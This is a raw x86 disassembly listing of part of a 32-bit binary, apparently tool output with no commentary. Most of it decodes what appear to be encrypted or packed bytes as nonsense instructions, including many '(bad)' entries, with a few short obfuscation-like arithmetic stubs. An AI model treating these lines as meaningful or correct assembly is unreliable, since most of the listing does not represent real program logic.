  405180:	scas   eax,DWORD PTR es:[edi]
  405181:	loopne 0x4051f0
  405183:	cmp    eax,0x3a0c5115
  405188:	int3   
  405189:	leave  
  40518a:	cmp    eax,0x71696e0c
  40518f:	jle    0x405165
  405191:	js     0x405210
  405193:	enter  0xa22d,0xbe
  405197:	adc    esi,DWORD PTR [ebx+0x7b]
  40519a:	xchg   BYTE PTR [ebx+0x55],ah
  40519d:	sbb    cl,BYTE PTR [ebp+0x50]
  4051a0:	or     bx,WORD PTR fs:[ecx+0x6bda5c74]
  4051a8:	jne    0x4051a8
  4051aa:	fwait
  4051ab:	push   esp
  4051ac:	push   edi
  4051ad:	cmp    BYTE PTR [esp+eax*1+0x31c60697],dh
  4051b4:	in     al,0x36
  4051b6:	mov    WORD PTR [ecx],fs
  4051b8:	push   ebx
  4051b9:	xor    dl,ch
  4051bb:	adc    DWORD PTR [esi-0x1f4add60],ecx
  4051c1:	arpl   WORD PTR [ecx],bp
  4051c3:	inc    ebp
  4051c4:	jl     0x4051db
  4051c6:	rcr    BYTE PTR [ebp-0x55],1
  4051c9:	imul   ebp,edi,0x4e
  4051cc:	xchg   edi,eax
  4051cd:	(bad)  
  4051ce:	retf   
  4051cf:	in     al,0xd4
  4051d1:	or     ecx,DWORD PTR gs:[ebp+0x74f74623]
  4051d8:	inc    esp
  4051d9:	xor    eax,0x98f26155
  4051de:	outs   dx,BYTE PTR fs:[esi]
  4051e0:	daa    
  4051e1:	pop    esi
  4051e2:	lock ret 0xea86
  4051e6:	imul   edi,eax,0xffffff8a
  4051e9:	push   eax
  4051ea:	jne    0x405249
  4051ec:	leave  
  4051ed:	mov    edx,DWORD PTR [ebp-0x3e]
  4051f0:	jecxz  0x4051c1
  4051f2:	fsubr  QWORD PTR [edi-0x7e87516f]
  4051f8:	add    eax,0xdf4a4cd6
  4051fd:	jo     0x405276
  4051ff:	loop   0x4051b7
  405201:	lods   al,BYTE PTR ds:[esi]
  405202:	js     0x405232
  405204:	inc    eax
  405205:	or     BYTE PTR [eax+0x66],dl
  405208:	mov    dh,0x96
  40520a:	xor    eax,0xb7899d63
  40520f:	mov    eax,esp
  405211:	aad    0x24
  405213:	out    0x6c,eax
  405215:	ds daa 
  405217:	dec    ecx
  405218:	scas   al,BYTE PTR es:[edi]
  405219:	mov    ebp,0x683f967a
  40521e:	int3   
  40521f:	es mov cl,0x19
  405222:	sub    DWORD PTR [eax],edx
  405224:	adc    esp,eax
  405226:	mov    esi,0x9dbadc6f
  40522b:	icebp  
  40522c:	out    dx,al
  40522d:	dec    ecx
  40522e:	xchg   edx,eax
  40522f:	cmp    ch,dh
  405231:	mov    eax,ds:0x2c5d1c6b
  405236:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405237:	mov    ch,0xe4
  405239:	push   edx
  40523a:	push   ss
  40523b:	mov    ds,WORD PTR [esi]
  40523d:	mov    ch,0xf8
  40523f:	ins    DWORD PTR es:[edi],dx
  405240:	les    edx,FWORD PTR [ebx-0x5e07180d]
  405246:	adc    edx,DWORD PTR [ecx]
  405248:	into   
  405249:	or     ch,BYTE PTR [esi]
  40524b:	test   BYTE PTR [ebx+0x4114ef70],bl
  405251:	add    DWORD PTR [edx],edx
  405253:	xchg   edx,eax
  405254:	dec    esp
  405255:	pop    eax
  405256:	sub    DWORD PTR [ebp-0x7c],edi
  405259:	lds    ecx,FWORD PTR [ebp-0x2fcb8668]
  40525f:	int3   
  405260:	jp     0x4051f7
  405262:	sub    eax,0xa0ae189
  405267:	ja     0x40528f
  405269:	xchg   edi,eax
  40526a:	mov    BYTE PTR [edx-0x3c],dl
  40526d:	loope  0x405291
  40526f:	(bad)  
  405270:	sbb    edx,edx
  405272:	mov    ebp,0xcb784efa
  405277:	inc    ebx
  405278:	lock pop ss
  40527a:	int3   
  40527b:	js     0x405290
  40527d:	xchg   edx,eax
  40527e:	es mov bl,0x7d
  405281:	retf   0xd63b
  405284:	pop    eax
  405285:	fiadd  DWORD PTR [esi-0x78]
  405288:	in     eax,0xa
  40528a:	jp     0x4052e7
  40528c:	into   
  40528d:	mov    bl,0x56
  40528f:	cmp    al,0x7b
  405291:	sbb    BYTE PTR [esi*1+0x29e112f6],dl
  405298:	mov    WORD PTR ds:0x39fead37,?
  40529e:	xor    al,0xd5
  4052a0:	jmp    0x7c95069a
  4052a5:	push   0x58
  4052a7:	rcl    BYTE PTR ds:0x3984bdbf,0xc5
  4052ae:	mov    al,0x15
  4052b0:	xchg   edi,eax
  4052b1:	mov    DWORD PTR [edx-0x16c509ca],ebp
  4052b7:	pop    edx
  4052b8:	ins    DWORD PTR es:[edi],dx
  4052b9:	cdq    
  4052ba:	mov    bh,0x60
  4052bc:	dec    ebx
  4052bd:	jne    0x40526c
  4052bf:	and    DWORD PTR [ecx-0x6c],esi
  4052c2:	sbb    bl,BYTE PTR [edx]
  4052c4:	dec    edi
  4052c5:	pop    esi
  4052c6:	lds    ebx,FWORD PTR [ebp+0x58]
  4052c9:	rcl    DWORD PTR [eax+0x7d],1
  4052cc:	sahf   
  4052cd:	push   0x35
  4052cf:	pop    eax
  4052d0:	cmp    ebx,DWORD PTR [ebx+0x12]
  4052d3:	jmp    0x40525e
  4052d5:	jbe    0x40526f
  4052d7:	call   0xf369f684
  4052dc:	in     al,dx
  4052dd:	xor    eax,0x77f639a5
  4052e2:	mov    ebp,0x15525cb8
  4052e7:	mov    eax,ds:0x41691367
  4052ec:	leave  
  4052ed:	sub    BYTE PTR [edi+0x4a],ch
  4052f0:	(bad)  
  4052f1:	out    dx,al
  4052f2:	lds    eax,FWORD PTR [edi-0x120ec6bf]
  4052f8:	add    BYTE PTR [ebx],0x8b
  4052fb:	cmc    
  4052fc:	add    esi,esi
  4052fe:	mov    ch,BYTE PTR [edx+0x1a]
  405301:	call   0xe30e:0x6a0303a5
  405308:	adc    bh,0x47
  40530b:	jno    0x405370
  40530d:	das    
  40530e:	ret    0x85e7
  405311:	xor    al,0x1f
  405313:	call   0x79d:0xf02759b9
  40531a:	push   eax
  40531b:	in     al,0xa6
  40531d:	xor    eax,DWORD PTR [edx+0x1b]
  405320:	mov    ebx,0xf9c7883c
  405325:	aaa    
  405326:	and    esi,0xde36b972
  40532c:	stos   DWORD PTR es:[edi],eax
  40532d:	out    dx,eax
  40532e:	xchg   ecx,eax
  40532f:	jle    0x40532f
  405331:	sbb    eax,0x3c82ce67
  405336:	mov    eax,ds:0xe8821d1a
  40533b:	mov    dl,0x45
  40533d:	sub    DWORD PTR [ebp+0x30979504],esi
  405343:	add    al,0x66
  405345:	xchg   esi,eax
  405346:	sub    bl,al
  405348:	jg     0x4053bf
  40534a:	test   al,0x3b
  40534c:	fiadd  WORD PTR [eax-0x6356dce4]
  405352:	lods   eax,DWORD PTR ds:[esi]
  405353:	mov    esp,DWORD PTR ds:0x9b6b850e
  405359:	in     al,dx
  40535a:	(bad)
  40535e:	cmp    BYTE PTR [edx+ebx*4],ah
  405361:	push   eax
  405362:	gs cmp al,0x2a
  405365:	std    
  405366:	xor    BYTE PTR [ebx+0x6c9341b1],bl
  40536c:	cdq    
  40536d:	loopne 0x4053a7
  40536f:	mov    bh,0xe5
  405371:	add    DWORD PTR [edi-0x4e],eax
  405374:	sahf   
  405375:	repz or ah,bl
  405378:	push   ebp
  405379:	and    BYTE PTR [esi],dh
  40537b:	aas    
  40537c:	call   0x6375:0x1f5fa7bb
  405383:	mov    edi,0x937a911
  405388:	fstp   QWORD PTR [ecx-0x10]
  40538b:	cmp    edi,DWORD PTR [edx+0x2]
  40538e:	xchg   DWORD PTR [ebx+eax*4-0x6abc742d],eax
  405395:	xor    al,0xfb
  405397:	adc    edi,DWORD PTR [eax+eiz*1+0x32]
  40539b:	mov    ds:0x21d8c9d7,eax
  4053a0:	push   ss
  4053a1:	mov    ds,WORD PTR [edi-0x7e15c0cd]
  4053a7:	jmp    0xffc87669
  4053ac:	inc    esi
  4053ad:	addr16 lock js 0x4053c4
  4053b1:	aad    0x93
  4053b3:	add    ebp,esi
  4053b5:	cmc    
  4053b6:	dec    edx
  4053b7:	leave  
  4053b8:	ins    BYTE PTR es:[edi],dx
  4053b9:	pop    es
  4053ba:	test   eax,0x9e48d16
  4053bf:	mov    ds:0x91493431,eax
  4053c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053c5:	jge    0x405365
  4053c7:	jno    0x405446
  4053c9:	ja     0x405380
  4053cb:	jb     0x4053f8
  4053cd:	repz sbb DWORD PTR [ecx],edx
  4053d0:	fs sbb ecx,esi
  4053d3:	xchg   edi,eax
  4053d4:	add    al,0x6
  4053d6:	dec    esp
  4053d7:	ins    DWORD PTR es:[edi],dx
  4053d8:	lods   eax,DWORD PTR ds:[esi]
  4053d9:	dec    eax
  4053da:	mov    al,0x69
  4053dc:	ud0    ebp,DWORD PTR [ebx+0x48f8af3b]
  4053e3:	fwait
  4053e4:	std    
  4053e5:	cwde   
  4053e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053e7:	xor    eax,0x8553a80f
  4053ec:	jnp    0x4053f3
  4053ee:	or     eax,0x708578b3
  4053f3:	pop    edx
  4053f4:	data16 jns 0x4053ec
  4053f7:	sbb    bl,ah
  4053f9:	les    ecx,FWORD PTR [esi-0x56f712cc]
  4053ff:	xlat   BYTE PTR ds:[ebx]
  405400:	and    DWORD PTR [edx],edi
  405402:	leave  
  405403:	jmp    0x5d0cbd87
  405408:	jmp    0x405405
  40540a:	pop    es
  40540b:	outs   dx,BYTE PTR ds:[esi]
  40540c:	ret    0xff7c
  40540f:	mov    ch,0xc
  405411:	mov    ch,0x2b
  405413:	mov    dh,0x25
  405415:	fs loop 0x40543c
  405418:	fstp   TBYTE PTR [esp+ebx*2]
  40541b:	shl    DWORD PTR [eax+0x3047e79],1
  405421:	icebp  
  405422:	dec    ebp
  405423:	jecxz  0x4053cb
  405425:	pushf  
  405426:	inc    esp
  405427:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405428:	rcr    DWORD PTR [ebx-0x658d4d5e],1
  40542e:	inc    ebp
  40542f:	mov    bh,0xc0
  405431:	mov    eax,DWORD PTR [edx+0x4d580068]
  405437:	hlt    
  405438:	neg    ebx
  40543a:	xchg   esi,eax
  40543b:	pop    ss
  40543c:	add    bl,BYTE PTR [edi-0x6f6ac214]
  405442:	sub    eax,0xed923a26
  405447:	cmp    bl,BYTE PTR [edi-0x52]
  40544a:	sbb    eax,0xef557cf1
  40544f:	or     eax,0x74d23b0b
  405454:	mov    eax,ds:0xd884ef98
  405459:	sbb    BYTE PTR [eax],ch
  40545b:	jns    0x405489
  40545d:	daa    
  40545e:	retf   0xa814
  405461:	cmp    WORD PTR [ebx],di
  405464:	cli    
  405465:	jbe    0x404ac0
  40546b:	mov    edx,DWORD PTR [ebp-0xc]
  40546e:	mov    edi,DWORD PTR [ebp-0x24]
  405471:	jmp    0x405774
  405476:	outs   dx,DWORD PTR ds:[esi]
  405477:	fisttp QWORD PTR [esi+0x6f6d8cef]
  40547d:	pop    ebp
  40547e:	fmul   QWORD PTR [edi+0x387afbb8]
  405484:	dec    eax
  405485:	(bad)  
  405486:	shr    BYTE PTR [ebx],1
  405488:	jle    0x405508
  40548a:	pop    eax
  40548b:	jl     0x40550b
  40548d:	jle    0x4054ac
  40548f:	cwde   
  405490:	mov    bl,0xd3
  405492:	push   cs
  405493:	das    
  405494:	in     al,dx
  405495:	cli    
  405496:	das    
  405497:	pop    ds
  405498:	les    edx,FWORD PTR [ebx-0x16e2b078]
  40549e:	add    eax,eax
  4054a0:	(bad)  
  4054a2:	test   al,0x80
  4054a4:	test   BYTE PTR [esp+0x3342ffae],0x4c
  4054ac:	js     0x40551e
  4054ae:	int3   
  4054af:	cmp    al,0x89
  4054b1:	pop    edx
  4054b2:	shl    BYTE PTR [eax-0x72],0x2d
  4054b6:	mov    esi,0x33d05dce
  4054bb:	rcl    BYTE PTR [eax-0x51d9419],1
  4054c1:	jo     0x405444
  4054c3:	pop    es
  4054c4:	push   ss
  4054c5:	outs   dx,DWORD PTR ds:[esi]
  4054c6:	aad    0x7f
  4054c8:	xor    eax,0x91468318
  4054cd:	iret   
  4054ce:	shr    al,1
  4054d0:	jmp    0x698a:0xc8ef1963
  4054d7:	mov    BYTE PTR [ebp+0x7d],al
  4054da:	pushf  
  4054db:	cmp    DWORD PTR [edi+ebx*1],ecx
  4054de:	mov    edx,0xbc71d6b6
  4054e3:	sub    ch,BYTE PTR [edi]
  4054e5:	adc    eax,0x9eecfe38
  4054ea:	add    ch,bh
  4054ec:	mov    BYTE PTR [edi+0xf6a2288],ah
  4054f2:	jge    0x405478
  4054f4:	add    edi,edi
  4054f6:	push   edx
  4054f7:	ror    DWORD PTR ds:0x82ab18dc,1
  4054fd:	jp     0x405504
  4054ff:	or     BYTE PTR [ebx-0x6aef162],dh
  405505:	adc    ebx,esi
  405507:	jle    0x4054b1
  405509:	cmp    edx,DWORD PTR [edx-0x71]
  40550c:	cmp    esp,DWORD PTR [esi-0x1874b8d3]
  405512:	sti    
  405513:	hlt    
  405514:	sti    
  405515:	pop    esp
  405516:	dec    esp
  405517:	push   0xcbb6b590
  40551c:	push   edi
  40551d:	xor    dl,bh
  40551f:	imul   eax,DWORD PTR [edx+edx*4-0x53],0xc7d1bc74
  405527:	xor    al,0xc7
  405529:	pop    edx
  40552a:	gs mov dl,0x56
  40552d:	sahf   
  40552e:	fmul   DWORD PTR [ecx+0x7f4eb429]
  405534:	popf   
  405535:	sub    DWORD PTR [eax+0x4],0x117715ef
  40553c:	in     al,0x57
  40553e:	xor    eax,0x12ae604c
  405543:	out    0x86,eax
  405545:	push   0x4f
  405547:	add    cl,BYTE PTR [ebx-0x331b8c43]
  40554d:	fwait
  40554e:	xlat   BYTE PTR ds:[ebx]
  40554f:	xchg   ecx,eax
  405550:	sti    
  405551:	lahf   
  405552:	aas    
  405553:	dec    BYTE PTR [esp+ebp*4]
  405556:	in     al,0xbb
  405558:	icebp  
  405559:	and    al,0x6d
  40555b:	pusha  
  40555c:	xor    esi,DWORD PTR [ebp-0x23345dc0]
  405562:	leave  
  405563:	rcr    bh,0x13
  405566:	(bad)  
  405568:	(bad)  
  405569:	aas    
  40556a:	sbb    al,0x76
  40556c:	adc    esi,DWORD PTR [edi-0x4b]
  40556f:	loope  0x4055da
  405571:	ret    0x819c
  405574:	ins    DWORD PTR es:[edi],dx
  405575:	xor    DWORD PTR [esi+ebx*4],0x59
  405579:	sbb    al,0x21
  40557b:	hlt    
  40557c:	shl    ah,cl
  40557e:	(bad)  
  40557f:	sbb    BYTE PTR [edx+0x7e],al
  405582:	push   ecx
  405583:	enter  0xfbc9,0x4a
  405587:	cli    
  405588:	push   es
  405589:	nop
  40558a:	jo     0x4055d4
  40558c:	push   esp
  40558d:	call   0x5c69271
  405592:	adc    dl,0xd5
  405595:	hlt    
  405596:	fsubr  st(3),st
  405598:	leave  
  405599:	sahf   
  40559a:	push   ebx
  40559b:	sbb    bl,BYTE PTR [ebx+0x739af3b5]
  4055a1:	sub    ebp,DWORD PTR [ecx-0x22]
  4055a4:	fwait
  4055a5:	lds    edi,FWORD PTR [ecx]
  4055a7:	scas   al,BYTE PTR es:[edi]
  4055a8:	fdivrp st(3),st
  4055aa:	mov    ch,BYTE PTR [ebp-0x53]
  4055ad:	nop
  4055ae:	dec    esi
  4055af:	jne    0x405586
  4055b1:	jo     0x40557b
  4055b3:	sbb    edx,esi
  4055b5:	pop    ebx
  4055b6:	mov    edx,DWORD PTR ds:0x2df22bbe
  4055bc:	push   ds
  4055bd:	inc    esp
  4055be:	pop    eax
  4055bf:	ins    BYTE PTR es:[edi],dx
  4055c0:	sar    BYTE PTR [ebp+0xa],0x37
  4055c4:	(bad)  
  4055c5:	(bad)
  4055c9:	cmp    BYTE PTR [ecx+0x32f17d31],0x53
  4055d0:	jmp    0x4055fc
  4055d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055d3:	add    al,0xdb
  4055d5:	jp     0x405600
  4055d7:	push   ss
  4055d8:	jns    0x4055d2
  4055da:	in     eax,dx
  4055db:	out    dx,al
  4055dc:	lahf   
  4055dd:	inc    edx
  4055de:	xchg   ah,cl
  4055e0:	(bad)  [ebp-0x6a55c95b]
  4055e6:	cmp    al,0x90
  4055e8:	ins    BYTE PTR es:[edi],dx
  4055e9:	icebp  
  4055ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055eb:	aaa    
  4055ec:	dec    esp
  4055ed:	jnp    0x405629
  4055ef:	mov    BYTE PTR [esi+0x4dd07cc2],bl
  4055f5:	cwde   
  4055f6:	enter  0xc6f2,0x50
  4055fa:	dec    ebx
  4055fb:	pop    ss
  4055fc:	pop    edi
  4055fd:	or     eax,0xebc7b523
  405602:	mov    ecx,0x7c51a7f2
  405607:	add    DWORD PTR [esi-0x59681ebb],esp
  40560d:	not    esp
  40560f:	(bad)  
  405610:	push   ebx
  405611:	nop
  405612:	imul   esp,DWORD PTR [esi],0x410ae711
  405618:	mov    bh,0x34
  40561a:	push   ecx
  40561b:	je     0x4055ae
  40561d:	sub    BYTE PTR ds:0x306c01e7,bl
  405623:	jg     0x40567b
  405625:	xor    edi,DWORD PTR [ebx]
  405627:	mov    ecx,0xff976ae7
  40562c:	mov    WORD PTR [ebp-0x3],fs
  40562f:	retf   0x27e5
  405632:	in     al,dx
  405633:	dec    esp
  405634:	ror    ah,0xd1
  405637:	(bad)  
  405638:	sub    eax,0xfad58d0c
  40563d:	test   dl,dh
  40563f:	or     dh,BYTE PTR [edi-0x7d]
  405642:	jge    0x4055dc
  405644:	fs retf 
  405646:	mov    al,0x87
  405648:	(bad)  
  405649:	sub    DWORD PTR [edx+0x483fece9],ebx
  40564f:	stos   DWORD PTR es:[edi],eax
  405650:	test   DWORD PTR [edx+0x32],ecx
  405653:	lahf   
  405654:	cld    
  405655:	mov    dl,BYTE PTR ds:0x2772885
  40565b:	jp     0x405616
  40565d:	(bad)  [ecx+0xe]
  405660:	stos   DWORD PTR es:[edi],eax
  405661:	push   ebx
  405662:	mov    bl,0xa0
  405664:	dec    DWORD PTR [eax]
  405666:	ficomp WORD PTR [eax-0x324187aa]
  40566c:	adc    ebp,esp
  40566e:	fidiv  WORD PTR [ecx+0x4ee37d99]
  405674:	fist   WORD PTR [eax-0x58ee69dd]
  40567a:	ret    0x69f0
  40567d:	jge    0x4056bb
  40567f:	aaa    
  405680:	out    0xc5,al
  405682:	test   DWORD PTR [eax],esp
  405684:	xchg   edx,eax
  405685:	jmp    0x405646
  405687:	sar    BYTE PTR [esp+edi*4],0xb9
  40568b:	and    esi,DWORD PTR [ebx]
  40568d:	mov    eax,ds:0xbcca7f9
  405692:	and    eax,0xc53a0169
  405697:	pop    edx
  405698:	xchg   BYTE PTR [ebx-0x22],dl
  40569b:	xor    bh,BYTE PTR [esi+0x42]
  40569e:	mov    cs:0x92a45156,al
  4056a4:	xor    esp,DWORD PTR [eax]
  4056a6:	ret    0xefc4
  4056a9:	in     al,dx
  4056aa:	shl    BYTE PTR [esi],0xe
  4056ad:	cwde   
  4056ae:	dec    ebp
  4056af:	pop    edi
  4056b0:	mov    al,0x50
  4056b2:	retf   
  4056b3:	or     eax,0x2d94279a
  4056b8:	push   0x26
  4056ba:	fisttp DWORD PTR [ecx]
  4056bc:	lahf   
  4056bd:	loope  0x405667
  4056bf:	lods   eax,DWORD PTR ds:[esi]
  4056c0:	mov    bl,BYTE PTR [esi]
  4056c2:	(bad)  
  4056c3:	push   ss
  4056c4:	mul    DWORD PTR [ebx]
  4056c6:	scas   al,BYTE PTR es:[edi]
  4056c7:	js     0x405690
  4056c9:	cs push ss
  4056cb:	stos   DWORD PTR es:[edi],eax
  4056cc:	cmp    ebp,DWORD PTR ds:0xa5b48d7c
  4056d2:	idiv   DWORD PTR [ecx]
  4056d4:	sbb    al,0x39
  4056d6:	adc    cl,ah
  4056d8:	test   DWORD PTR [edx+0x6f],eax
  4056db:	fsub   DWORD PTR [ecx+0x2f4d9c50]
  4056e1:	push   ss
  4056e2:	outs   dx,DWORD PTR ds:[esi]
  4056e3:	clc    
  4056e4:	cmc    
  4056e5:	pop    edi
  4056e6:	dec    eax
  4056e7:	in     al,dx
  4056e8:	sbb    edx,eax
  4056ea:	cmp    ebp,ebx
  4056ec:	pop    ecx
  4056ed:	add    esp,eax
  4056ef:	loop   0x405697
  4056f1:	inc    eax
  4056f2:	cmp    BYTE PTR [ebx-0x45],cl
  4056f5:	neg    BYTE PTR [ebx-0x11]
  4056f8:	ffreep st(4)
  4056fa:	arpl   WORD PTR [edx],cx
  4056fc:	outs   dx,DWORD PTR ds:[esi]
  4056fd:	xchg   ebp,eax
  4056fe:	cdq    
  4056ff:	iret   
  405700:	addr16 popa 
  405702:	mov    eax,ds:0xafe0deb8
  405707:	lahf   
  405708:	xor    DWORD PTR [ebp-0xb],edi
  40570b:	fisttp QWORD PTR [ebx]
  40570d:	cdq    
  40570e:	adc    eax,DWORD PTR [ecx-0x8]
  405711:	mov    ecx,0x23c18547
  405716:	and    BYTE PTR [esi-0x46],bh
  405719:	inc    ebp
  40571a:	iret   
  40571b:	(bad)  
  40571d:	inc    eax
  40571e:	in     eax,dx
  40571f:	sbb    al,0x16
  405721:	fisttp QWORD PTR [bx+di]
  405724:	jnp    0x40570d
  405726:	jp     0x405751
  405728:	(bad)  
  405729:	cli    
  40572a:	cmp    dl,BYTE PTR cs:[edi]
  40572d:	les    edi,FWORD PTR [ebx-0x595f232c]
  405733:	(bad)  
  405735:	loop   0x405714
  405737:	pop    edi
  405738:	sbb    DWORD PTR [ebp-0x30],edx
  40573b:	dec    esi
  40573c:	pop    ecx
  40573d:	mov    al,0x63
  40573f:	into   
  405740:	fnstcw WORD PTR [eax]
  405742:	cld    
  405743:	in     al,0x68
  405745:	in     eax,0xe4
  405747:	(bad)  
  405749:	into   
  40574a:	inc    eax
  40574b:	xchg   BYTE PTR [ebp-0x2b148be4],bl
  405751:	imul   ecx,esi,0xc
  405754:	icebp  
  405755:	mov    cl,0x12
  405757:	push   edx
  405758:	xor    cl,0xb9
  40575b:	adc    al,0xbe
  40575d:	add    DWORD PTR [edi],0xeefc014f
  405763:	jmp    0x405728
  405765:	ins    DWORD PTR es:[edi],dx
  405766:	ret    0xd782
  405769:	pop    ecx
  40576a:	jl     0x405715
  40576c:	iret   
  40576d:	aam    0x2c
  40576f:	adc    eax,0x41876e85
  405774:	xor    edx,eax
  405776:	add    edx,ecx
  405778:	imul   edx,edi
  40577b:	mov    edi,DWORD PTR [ebp-0x18]
  40577e:	xor    edi,eax
  405780:	add    edx,edi
  405782:	mov    edi,DWORD PTR [ebp-0x8]
  405785:	lea    edx,[edx+edi*1+0x32729b]
  40578c:	mov    DWORD PTR [ebp-0x8],edx
  40578f:	mov    edx,DWORD PTR [ebp-0x20]
  405792:	xor    edx,eax
  405794:	mov    edi,0xffcd8d65
  405799:	sub    edi,edx
  40579b:	add    edi,DWORD PTR [ebp-0x10]
  40579e:	mov    edx,DWORD PTR [ebp-0x20]
  4057a1:	mov    ebx,DWORD PTR [ebp-0x8]
  4057a4:	xor    edx,eax
  4057a6:	add    edx,ecx
  4057a8:	imul   edx,ebx
  4057ab:	cmp    edx,edi
  4057ad:	jbe    0x4038ea
  4057b3:	pop    ebx
  4057b4:	pop    edi
  4057b5:	leave  
  4057b6:	ret    0x8
  4057b9:	push   ebp
  4057ba:	mov    ebp,esp
  4057bc:	push   ecx
  4057bd:	mov    ecx,DWORD PTR [ebp+0x8]
  4057c0:	and    eax,DWORD PTR ds:0x43381b
  4057c6:	mov    eax,0x7510854
  4057cb:	xor    DWORD PTR ds:0x433723,0x433703
  4057d5:	xor    ecx,eax
  4057d7:	not    DWORD PTR ds:0x43375f
  4057dd:	add    ecx,0x32729b
  4057e3:	jmp    0x405b32
  4057e8:	scas   eax,DWORD PTR es:[edi]
  4057e9:	inc    BYTE PTR [ebp-0x39]
  4057ec:	jne    0x4057b3
  4057ee:	lods   eax,DWORD PTR ds:[esi]
  4057ef:	jbe    0x4057a1
  4057f1:	loopne 0x4057f0
  4057f3:	mov    al,0x3e
  4057f5:	retf   
  4057f6:	inc    esp
  4057f7:	push   ecx
  4057f8:	cmp    dh,BYTE PTR [esi]
  4057fa:	jle    0x40587a
  4057fc:	sub    al,0x7d
  4057fe:	jle    0x40587e
  405800:	sbb    DWORD PTR [esi+0x4d],edx
  405803:	mov    dl,BYTE PTR [edi+0x6635a750]
  405809:	cmp    ebp,ecx
  40580b:	outs   dx,DWORD PTR ds:[esi]
  40580c:	inc    edx
  40580d:	mov    edx,0xf393a093
  405812:	shr    BYTE PTR [edx],1
  405814:	push   es
  405815:	push   edx
  405816:	js     0x4057bd
  405818:	test   DWORD PTR [edx-0x75],ebx
  40581b:	xchg   DWORD PTR [esp+esi*2-0x69],eax
  40581f:	or     ebx,0x66244fee
  405825:	mov    ds:0xfc52053f,eax
  40582a:	inc    ebp
  40582b:	sub    ebx,esp
  40582d:	test   eax,0x36a7fd3f
  405832:	push   ds
  405833:	enter  0xaf26,0x5c
  405837:	xor    eax,0xec3380a8
  40583c:	shr    DWORD PTR [eax+ebx*8-0x2d5f3ea4],cl
  405843:	jmp    0x9051:0x686c9491
  40584a:	ins    DWORD PTR es:[edi],dx
  40584b:	imul   eax,DWORD PTR [eax],0xffffffdb
  40584e:	mov    esi,0x521f7ec0
  405853:	popf   
  405854:	pushf  
  405855:	js     0x40581c
  405857:	mov    esp,0xc717bf51
  40585c:	inc    edi
  40585d:	mov    BYTE PTR [ecx+0x75],bl
  405860:	push   edx
  405861:	shr    bh,cl
  405863:	pop    ecx
  405864:	into   
  405865:	or     ebx,eax
  405867:	mov    ah,0xd3
  405869:	pop    ds
  40586a:	pop    ebx
  40586b:	inc    esi
  40586c:	popf   
  40586d:	or     al,0x1
  40586f:	cs xchg esi,eax
  405871:	or     ebx,DWORD PTR [eax-0x5d]
  405874:	aam    0xa9
  405876:	mov    ch,BYTE PTR [eax]
  405878:	jmp    0xca057c22
  40587d:	mov    ah,0xe5
  40587f:	mov    dh,0x6f
  405881:	jecxz  0x40582d
  405883:	add    eax,0xc44235b0
  405888:	mov    al,0x49
  40588a:	mov    edx,0x63fbd458
  40588f:	push   ebx
  405890:	jp     0x40590b
  405892:	aad    0x26
  405894:	xchg   edx,eax
  405895:	stos   BYTE PTR es:[edi],al
  405896:	cmp    bl,dh
  405898:	xor    BYTE PTR [eax+0x26],bl
  40589b:	ret    
  40589c:	ins    BYTE PTR es:[edi],dx
  40589d:	sar    BYTE PTR [ecx+esi*2],1
  4058a0:	push   ds
  4058a1:	cmp    al,0xb4
  4058a3:	xchg   esp,eax
  4058a4:	fwait
  4058a5:	out    0xd3,al
  4058a7:	pop    ebx
  4058a8:	popa   
  4058a9:	bound  edi,QWORD PTR [ecx]
  4058ab:	fisttp QWORD PTR [esi]
  4058ad:	cwde   
  4058ae:	call   0x4819:0xea9719a4
  4058b5:	test   BYTE PTR ds:0xfb280d28,bh
  4058bb:	dec    ebx
  4058bc:	ror    DWORD PTR [ecx-0x50],1
  4058bf:	xchg   ebp,eax
  4058c0:	int3   
  4058c1:	in     eax,dx
  4058c2:	jno    0x40588c
  4058c4:	out    0x63,al
  4058c6:	sub    eax,0xb071ebf7
  4058cb:	aad    0xf2
  4058cd:	lods   al,BYTE PTR ds:[esi]
  4058cf:	aaa    
  4058d0:	call   0x49067403
  4058d5:	test   DWORD PTR [ebx-0x6a],edx
  4058d8:	push   cs
  4058d9:	dec    edx
  4058da:	sbb    eax,0x90218953
  4058df:	shr    BYTE PTR [esi],0x2c
  4058e2:	aad    0xea
  4058e4:	xor    eax,0xd4386af8
  4058e9:	jle    0x405940
  4058eb:	clc    
  4058ec:	sub    eax,0x2241f8c3
  4058f1:	in     al,dx
  4058f2:	add    BYTE PTR [ebp-0xa],0xa2
  4058f6:	sahf   
  4058f7:	fistp  QWORD PTR [edi-0xefc67b8]
  4058fd:	pushf  
  4058fe:	xchg   ebx,eax
  4058ff:	ret    
  405900:	jne    0x405915
  405902:	out    0x80,al
  405904:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405905:	(bad)  
  405906:	repz fcmovnu st,st(0)
  405909:	fcmovnbe st,st(6)
  40590b:	or     bh,ch
  40590d:	into   
  40590e:	pop    ss
  40590f:	aaa    
  405910:	jnp    0x4058d0
  405912:	sbb    ch,BYTE PTR [eax+edx*8]
  405915:	imul   eax,ecx,0x85c67fcf
  40591b:	out    dx,al
  40591c:	add    al,0x41
  40591e:	aad    0xef
  405920:	gs jmp 0xd3a4:0xf805bfbf
  405928:	pop    ecx
  405929:	xchg   ebp,eax
  40592a:	push   cs
  40592b:	sub    BYTE PTR [eax+0x4681466c],bh
  405931:	or     al,0xe4
  405933:	test   BYTE PTR [ecx+0x2b],dl
  405936:	jb     0x4058c6
  405938:	dec    ecx
  405939:	inc    esi
  40593a:	(bad)  
  40593c:	sti    
  40593d:	rol    esp,cl
  40593f:	xchg   ebx,eax
  405940:	lahf   
  405941:	pop    ebp
  405942:	pop    eax
  405943:	or     BYTE PTR [ebp-0x28],ch
  405946:	add    edx,edi
  405948:	cmp    eax,0x27880f64
  40594d:	xchg   ecx,eax
  40594e:	das    
  40594f:	in     al,0x7f
  405951:	mov    bh,0xff
  405953:	in     eax,0x4
  405955:	inc    al
  405957:	popf   
  405958:	jo     0x40598b
  40595a:	pusha  
  40595b:	gs dec ebx
  40595d:	xchg   edi,eax
  40595e:	xchg   BYTE PTR [eax+0x52],dh
  405961:	ret    
  405962:	movups XMMWORD PTR [esi-0x7cb42918],xmm0
  405969:	stc    
  40596a:	sbb    al,0x22
